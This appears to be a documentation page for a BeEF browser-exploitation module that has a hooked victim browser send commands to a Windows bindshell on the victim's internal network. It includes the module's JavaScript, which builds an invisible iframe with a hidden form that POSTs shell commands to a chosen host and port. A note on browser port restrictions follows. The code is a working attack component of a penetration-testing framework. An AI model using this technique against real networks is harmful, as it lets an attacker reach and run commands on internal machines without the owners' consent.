## Summary

* **Objective**: Execute command on a Windows bindshell
* **Authors**: bcoles, wade
* **Browsers**: Firefox, Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/ipec/inter_protocol_win_bindshell)

## Internal Working

Using Inter-Protocol Exploitation/Communication (IPEC) the hooked browser will send commands to a listening Windows shell bound on the target specified in the 'Target Address' input field.

The target address can be on the hooked browser's subnet which is potentially not directly accessible from the Internet.

The results of the commands are not returned to BeEF.

Note: ampersands are used to seperate commands.

```js

// send commands
var win_ipec_form_<%= @command_id %> = beef.dom.createIframeIpecForm(rhost, rport, "/index.html?&cmd&", cmd + " & exit");
beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Shell commands sent');

//createIframeIpecForm function

createIframeIpecForm: function(rhost, rport, path, commands){
    var iframeIpec = beef.dom.createInvisibleIframe();

    var formIpec = document.createElement('form');
    formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
    formIpec.setAttribute('method',  'POST');
    formIpec.setAttribute('enctype', 'multipart/form-data');

    input = document.createElement('textarea');
    input.setAttribute('name', Math.random().toString(36).substring(5));
    input.value = commands;
    formIpec.appendChild(input);
    iframeIpec.contentWindow.document.body.appendChild(formIpec);
    formIpec.submit();

    return iframeIpec;
}


```


## References

Some ports are restricted in newer versions of Chrome-like browsers and Firefox
e.g. (21,22,23,25,513 etc.)
https://e1tips.com/2014/03/17/allow-firefox-chrome-to-access-restricted-ports/

## Feedback


